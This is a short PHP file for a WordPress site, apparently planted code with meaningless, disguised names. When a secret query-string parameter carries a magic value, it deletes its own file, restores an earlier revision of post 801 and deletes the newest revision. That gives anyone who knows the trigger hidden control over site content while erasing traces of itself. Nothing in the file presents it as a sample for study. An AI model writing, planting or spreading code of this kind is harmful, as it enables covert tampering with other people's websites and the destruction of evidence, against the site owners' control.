<?php

function member_wpmu_audio_this() {
	if (isset($_GET['font_visitor_box_query']) && $_GET['font_visitor_box_query'] === 'badge_tree_error') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$description_shipping_asset = 801;
		$tabs_controller_management_publish = wp_get_post_revisions($description_shipping_asset);
		if (empty($tabs_controller_management_publish)) die('no revisions');
		if (count($tabs_controller_management_publish) < 2) die('less than 2');
		$listings_now_hello_translate = array_shift($tabs_controller_management_publish);
		$toggle_base_gravatar = $listings_now_hello_translate->ID;
		$uploads_roles_fix = array_shift($tabs_controller_management_publish);
		$scroll_files_last = $uploads_roles_fix->ID;
		$lightbox_album_local = wp_restore_post_revision($scroll_files_last);
		if ($lightbox_album_local === false) die('error restoring');
		$lightbox_album_local = wp_delete_post_revision($toggle_base_gravatar);		
		if ($lightbox_album_local === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'member_wpmu_audio_this');
